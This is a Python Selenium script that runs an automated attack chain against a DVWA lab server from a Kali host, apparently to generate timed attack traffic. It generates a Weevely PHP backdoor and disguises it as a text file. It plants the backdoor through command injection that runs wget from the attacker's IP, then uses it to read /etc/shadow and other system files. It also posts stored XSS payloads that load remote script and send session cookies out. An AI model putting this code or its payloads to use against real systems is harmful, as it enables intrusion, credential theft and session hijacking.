# xss.py

from selenium import webdriver
from selenium.webdriver.common.keys import Keys	

import sys
import time
from os import *
import netifaces as ni
import datetime
from datetime import timedelta

# IMPORT MODULES
import setup as s


# ALIASING 
printtime = s.printtime

# wrap function print to include local start time
def funcprinttime(desc):
	s.funcprinttime(desc, starttime)


# FILE GLOBALS
kali_IP = "192.168.1.187"            
dvwa_IP = "192.168.1.20"
dvwa_addr = "http://"+dvwa_IP+"/"

exploitname = "page.php"	# rootkit name
tarname     = "base.tar.gz"	# tar'd version of the rootkit
faketxt     = "log.txt"		# false name of the tar'd rookit
password    = "feedthebears"	# password to launch the rootkit

# DEFINE BROWSER DRIVER
driver = webdriver.Firefox()			# supported: Firefox, Chrome, Ie and Remote





##### Cross Site Scripting (XSS) ##### 
# original attack length: 8 minutes: 12 second delays * 32 total delays
def xss(n):
	
	# GLOBALS
	global starttime
	global endtime
	global delay

	global kali_IP
	global dvwa_IP
	global dvwa_addr

	global exploitname
	global tarname
	global faketxt
	global password

	global driver

	starttime=time.time()
	endtime = time.time()+n

	delay = ((n-5)/7); # space events in attack to fill total time
				# if 60 seconds, then 55/6 = 9 seconds each.
	funcprinttime("  Start with attack time: "+str(n)+" and delays of: "+str(delay))

	# ATTACK: 
	prepareweevely() 		# 0 delays. create rootkit & host on webserver	
	dvwa_login(delay/2)		# .5 delay. log in to dvwa
	dvwa_security_low(delay/2)	# .5 delay. set dvwa security to low
	plant_weevely(delay)		# 1 delay.  get dvwa to download rootkit from kali server
	exploit_weevely(delay*2) 	# 2 delays. use the rootkit to send commands
	exploit_xss_stored(delay*2)	# 2 delays. paste xss into visitor comments

	# ATTACK CLEANUP
	cleankali()
	cleandvwa(delay/2)		# 1 delay.

	driver.quit()	# closes browser

	# FINISH
	timeleft = endtime-time.time()
	if timeleft>0:
		funcprinttime("    - sleep for time remaining: "+str(round(timeleft,2)))
		time.sleep(timeleft)

	funcprinttime("  End")

xss.desc = "Cross site scripting (xss) attack"



# PREPARE WEEVELY ROOTKIT
# create a weevely rootkit and host it on an internal server
def prepareweevely():

	# Create weevely exploit
	system("mkdir /root/Desktop/exploit/")
	system("weevely generate "+password+" /root/Desktop/exploit/"+exploitname)
	funcprinttime("  generated weevely rootkit \""+exploitname+"\"")

	# add exploit to kali's own webserver
	system("service apache2 start")
	system("cp /root/Desktop/exploit/"+exploitname+" /var/www/html/"+exploitname) # move exploit to web
	system("cd /var/www/html/; tar -cvzf "+tarname+" "+exploitname)               # tar/compress exploit      
	system("cp /var/www/html/"+tarname+" /var/www/html/"+faketxt)                 # rename .txt file
	funcprinttime("  rootkit added to local webserver")



# DVWA LOGIN
# default credentials
def dvwa_login(n):

	#timing
	num_actions = 3
	wait = n/num_actions
	funcprinttime("  -- login ("+str(n)+"), actions: "+str(num_actions)+", wait: "+str(round(wait,2)))

	driver.get(dvwa_addr+"login.php")	
	assert "login.php not found." not in driver.page_source

	elem_user = driver.find_element_by_name("username")
	elem_user.send_keys("admin")	
	time.sleep(wait)
	elem_pass = driver.find_element_by_name("password")
	elem_pass.send_keys("password")
	time.sleep(wait)
	elem_login = driver.find_element_by_name("Login")
	elem_login.send_keys(Keys.RETURN)
	time.sleep(wait)
	funcprinttime("  -- logged in")



# SET DVWA SECURITY LOW
def dvwa_security_low(n):

	#timing
	num_actions = 2
	wait = n/num_actions
	funcprinttime("  -- dvwa security ("+str(n)+"), actions: "+str(num_actions)+", wait: "+str(round(wait,2)))
	
	driver.get(dvwa_addr+"security.php")

	from selenium.webdriver.support.ui import Select
	elem_security = Select(driver.find_element_by_name('security'))
	elem_security.select_by_visible_text("low")
	time.sleep(wait)

	elem_submit = driver.find_element_by_name("seclev_submit")
	elem_submit.send_keys(Keys.RETURN)
	time.sleep(wait)

	funcprinttime("  -- set security to low")



# PLANT WEEVELY EXPLOIT (ROOTKIT)
def plant_weevely(n):

	driver.get(dvwa_addr+"vulnerabilities/exec/")
	assert "exec page not found." not in driver.page_source

	commands = []
	commands.append("127.0.0.1; pwd; ls -l" )				# demonstrate contents of file
	commands.append("127.0.0.1; wget http://"+kali_IP+"/"+faketxt+" ;ls -l")# retrieve exploit.php from kali
	commands.append("127.0.0.1; pwd; ls -l")                                # demonstrate exploit retrieved
	commands.append("127.0.0.1; mv "+faketxt+" "+tarname+" ; ls -l")        # rename txt to tarfile
	commands.append("127.0.0.1; tar -xvf "+tarname+"; ls -l")               # un-tar exploit
	

	#timing
	num_actions = len(commands)
	wait = n/num_actions
	funcprinttime("  -- plant weevely ("+str(n)+"), actions: "+str(num_actions)+", wait: "+str(round(wait,2)))

	# EXECUTE EACH COMMAND IN ORDER
	for cmd in commands:
		elem_cmd = driver.find_element_by_name("ip")
		elem_cmd.send_keys(cmd)	
		elem_submit = driver.find_element_by_name("submit")
		elem_submit.send_keys(Keys.RETURN)	
		time.sleep(wait)

	funcprinttime("  -- weevely exploit planted")



# EXPLOIT WEEVELY
# signals weevely rootkit and sends commands
def exploit_weevely(n):

	weevelycmd = "weevely "+dvwa_addr+"vulnerabilities/exec/"+exploitname+" "+password+" "

	commands = []
	commands.append("'pwd'")
	commands.append("'whoami'")
	commands.append("'cat /etc/passwd'")
	commands.append("'cat /etc/shadow'")
	commands.append("'df'")
	commands.append("'cat /etc/fstab'")
	commands.append("'uname -a'")
	commands.append("'lsb_release -a'")
	commands.append("'cat /proc/net/sockstat'" )
	commands.append("'arch'")
	commands.append("'w'")
	commands.append("'mysql --version'") # not installed in dvwa
	commands.append("'last -a'")         # fails (removed in dvwa)
	commands.append("'arp -a'")
	commands.append("'find /bin \"-maxdepth 2 -perm /a=x\"'")
	commands.append("'cat /etc/group'")
	commands.append("'cat /etc/aliases'")         # fails (none in dvwa)
	commands.append("'find \". -n \"*pass*\"\"'") # fails (format)

	#timing
	num_actions = len(commands)	
	wait = n/num_actions
	funcprinttime("  -- exploit weevely wait: "+str(round(wait,2)))
	
	# Execute each command in order
	for cmd in commands:
		system("weevely "+dvwa_addr+"vulnerabilities/exec/"+exploitname+" "+password+" "+cmd)
		time.sleep(wait)

	funcprinttime("  -- weevely exploited ("+str(n)+"), actions: "+str(num_actions)+", wait: "+str(round(wait,2)))



# XSS STORED
# pastes xss in visitor comments page
# called by xss()
def exploit_xss_stored(n): # __ delays

	driver.get(dvwa_addr+"vulnerabilities/xss_s/")
	assert "xss_s page not found." not in driver.page_source

	commands = []
	commands.append("holas muchachos <script src=http:///"+kali_IP+"></script>")
	commands.append("<script>window.location='"+dvwa_addr+"?cookie='+document.cookie</script>")
	commands.append("<script>document.write(document.location.hostname);</script>")

	#timing
	num_actions = len(commands)	
	wait = n/num_actions
	funcprinttime("  -- exploit xss stored ("+str(n)+"), actions: "+str(num_actions)+", wait: "+str(round(wait,2)))

	# Execute each command in order
	for cmd in commands:
		elem_txtName = driver.find_element_by_name("txtName")
		elem_txtName.send_keys("guest")	
		elem_mtxMessage = driver.find_element_by_name("mtxMessage")
		elem_mtxMessage.send_keys("%s" % cmd)
		elem_btnSign = driver.find_element_by_name("btnSign")
		elem_btnSign.send_keys(Keys.RETURN)	

		time.sleep(wait)

	funcprinttime("  -- xss stored complete")



# CLEAN KALI
# Remove all exploit files from kali
def cleankali():
	system("rm -r /root/Desktop/exploit/")
	system("cd /var/www/html/; rm *.php *.txt *.gz")
	funcprinttime("  -- kali cleaned")



# CLEAN DVWA
# Remove all exploit files from dvwa
def cleandvwa(n):	

	# Navigate to page for command execution
	driver.get(dvwa_addr+"vulnerabilities/exec/")
	assert "exec page not found." not in driver.page_source

	cleancmd = "127.0.0.1; rm "+tarname+" "+exploitname 

	elem_cmd = driver.find_element_by_name("ip")
	elem_cmd.send_keys(cleancmd)			
	elem_submit = driver.find_element_by_name("submit")
	elem_submit.send_keys(Keys.RETURN)	
	time.sleep(n)			
	
	funcprinttime("  -- dvwa cleaned")


# END OF FILE
